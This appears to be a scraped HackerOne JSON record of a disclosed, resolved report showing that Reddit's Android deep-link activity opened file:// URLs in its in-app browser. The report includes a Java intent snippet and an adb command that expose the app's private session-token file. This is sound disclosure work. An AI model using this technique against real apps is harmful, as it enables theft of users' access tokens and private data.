@@ -1,0 +1,205 @@
+{
+  "id": 1122177,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTIyMTc3",
+  "url": "https://hackerone.com/reports/1122177",
+  "title": "Third party app could steal access token as well as protected files using inAppBrowser",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-10T11:15:25.000Z",
+  "submitted_at": "2021-03-10T11:15:25.020Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rahulkankrale",
+    "url": "/rahulkankrale",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/502/d37e781fc65b9d9b3af63e6a0094450fe5c68509_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35710,
+    "url": "https://hackerone.com/reddit",
+    "handle": "reddit",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Reddit",
+      "twitter_handle": "reddit",
+      "website": "https://www.reddit.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-10-27T14:10:40.811Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-20T10:12:35.335Z",
+  "team_member_agreed_on_going_public_at": "2021-10-27T14:10:40.625Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nReddit android app version : 2021.8.0 \nOS: Android 11\n\nThis app uses com.reddit.frontpage.RedditDeepLinkActivity class to route app links including deeplink and reddit.com links while this class does not check for scheme, host and it opens given url in InAppBrowser and IAB have access to apps private/protected files.\n\nSo any third party app could steal session token from \"data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml\" files as well as rest of sensitive files like DB, Cookies etc. \n\n## Impact:\nThird party app could steal access token as well as protected files using inAppBrowser\n\n## Steps To Reproduce:\nTo reproduce this issue I have created basic poc:\n  1. Create third-party app using snippet (Replace UserName to victims username i.e. file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.**Strong-Sun628**.xml) :\n\n```java \n        Intent intent = new Intent();\n        intent.setClassName(\"com.reddit.frontpage\", \"com.reddit.frontpage.RedditDeepLinkActivity\");\n        intent.setData(Uri.parse(\"file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml\"));\n        startActivity(intent);\n``` \n  1. Once open third-party app, Reddit app opens InAppBrowser with auth_active file and its data contained token.\n  2. We could also reproduce this quickly using adb:\n\n```shell\nadb shell am start -n \"com.reddit.frontpage/com.reddit.frontpage.RedditDeepLinkActivity\" -d \"file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.frontpage_preferences.xml\"\n```\n\n## Supporting Material/References:\nVideo : Proof of concept\n  * F1225199\n\nif required I can submit complete POC to show how third-party app could save this files and send to attackers server.\n\nThanks\nRahul\n\n## Impact\n\nThird party app could steal access token as well as protected files using inAppBrowser",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1225199,
+      "file_name": "reddit.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/26b1fe87y3ry9rpi15105ofh3rq7?response-content-disposition=attachment%3B%20filename%3D%22reddit.mp4%22%3B%20filename%2A%3DUTF-8%27%27reddit.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQXTSGMXA%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T054626Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJHMEUCIGFnIW2WUNn0x8hbPRY7oM22sw2Xm7S8%2B2D4mwS%2FeMhgAiEA0J6C62JkkmUMjkD7XdMGI3f2HY0KtlrFYbLsAtwkz3EqsQUIBhADGgwwMTM2MTkyNzQ4NDkiDE37GMXipvlz%2BYZxGiqOBW6ANRH7yJYNML5ebQKtTtJdnIBt1BmM8W9WUDXdlqwW983G6e9i4MdLSFzrg%2BCp8yZNwWZKYxRfLHv0ge4duHwhOLdrOvaGMy3kmDQ86Yt90%2BTavwFIsqyXD6urS7v3wKkV6UORmn8g6I2wnxcgA4Pb2nmOkAqqcObU8G7XPVIvd7C3jcm1%2FkUS6SYJjkP%2FbfHHxnJJn22VXobGDC4tWxX4%2Bpygp5%2BG%2BlK4W8kS89kFQQuFIcmnMlDreEW51oWftyaBeBu9TP6tpZIbTO3s1Wn8vcA8nW9Qk1sZgkqAJPQj820q7ssM5ECrcZPHYoA38QU40XnCdZIBa%2Fg5oJycOAfLwo5QmkYDrNOuIJqZbnpRrSjg9%2FA9hwE7gp9GUo40et3G0SolHv6B8JUmJonL%2Fcl4B8wih6fSQJ7nURMySpCm%2FQXZ9cuFQ1iqZwXWIEnO%2FVK38KIkAATJ4TokkRzd62LibGmC3UuIQhlWvsms4XtJPY6bN1TGtZp5zEAPXKWIiYL1FEJXtDdV99iW4XhRIvWKE1H8ZB%2BLQa72x2VyQQy9ppEwkpK8MeCxy%2F4mYFNevexuklfKt44GhgzJRIbM8Pt9lLM%2FjPbib5U%2Fy4hp1Hh9laP2tUm2RDMRvMWHyDQ1E0lvD6fJMZ%2FXTP8h6%2FtJkGwqNEjtmAZj4FT2v4NB3%2FzsztwMF08ZuawOOXOMVQS2NIQdJalmuCy2gEvQlNuG5zo8M7wUxbXGC%2FUeL9GJoilPY1KQ8pvAa%2FAJdRZGkIJVWaBRtuDusHGPkCbTDd66BIcXknaN89qx95QUlF2T5LWxtnDeAnDls8ulVp%2BF3CWlpkiKBX%2FKdKOcIm8jWrig9E%2FDxWREdrLcaDDgX6mJ8jDygp3SBjqxAa25fZoiZ1poW6rQF1qqHTBhhfKF8oXlHmDwLsDv8O4D%2F5pFXrDTNh3B1cSqkbmp0gQEXbP%2BHtWcpsrwL4DCDWGbyWv5MlnQ7CgyLOFdRZV68LBwXx6TVv5xRA3Eb6Iz2396IhKLqoKpPIsuAkf5xZf92WiLhISIzh36mTJot1RIM027QKp5QgJ9PN58jmIQW8tdUOvTLoPo3D23Wx7CLs5bvHtqQR6VdqiBODVuyj1Klg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=60e8f505809bf575daae3467695bb7972ef2dd03c7100e1f55bb42d9a15faff9",
+      "file_size": 1082690,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 32,
+  "voters": [
+    "0x800700e1",
+    "drsniper",
+    "bombon",
+    "fanimalikhack",
+    "run_win",
+    "shreyaschavhan",
+    "akashhamal0x01",
+    "h4x0r_dz",
+    "iamunixtz",
+    "2026",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 22298,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.reddit.frontpage",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1122177",
+  "votes": 32,
+  "latest_disclosable_activity_at": "2021-10-27T14:10:40.861Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:46:26.264765",
+    "source": "https://hackerone.com/reports/1122177.json",
+    "report_id": 1122177
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTIyMTc3",
+    "databaseId": "1122177",
+    "title": "Third party app could steal access token as well as protected files using inAppBrowser",
+    "url": "https://hackerone.com/reports/1122177",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2021-10-27T14:10:40.811Z",
+    "created_at": "2021-03-10T11:15:25.000Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE4",
+      "name": "Information Disclosure",
+      "external_id": "cwe-200"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "rahulkankrale"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NzEw",
+      "handle": "reddit",
+      "name": "Reddit",
+      "url": "https://hackerone.com/reddit",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yOTUzNzQ=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2021-04-15T16:01:25.621Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzExMjIxNzc=",
+    "_id": "1122177",
+    "disclosed": true,
+    "votes": 32,
+    "latest_disclosable_activity_at": "2021-10-27T14:10:40.861Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTIyMTc3",
+      "databaseId": "1122177",
+      "title": "Third party app could steal access token as well as protected files using inAppBrowser",
+      "url": "https://hackerone.com/reports/1122177",
+      "disclosed_at": "2021-10-27T14:10:40.811Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NzEw",
+      "handle": "reddit",
+      "name": "Reddit",
+      "url": "https://hackerone.com/reddit",
+      "currency": "usd"
+    }
+  }
+}
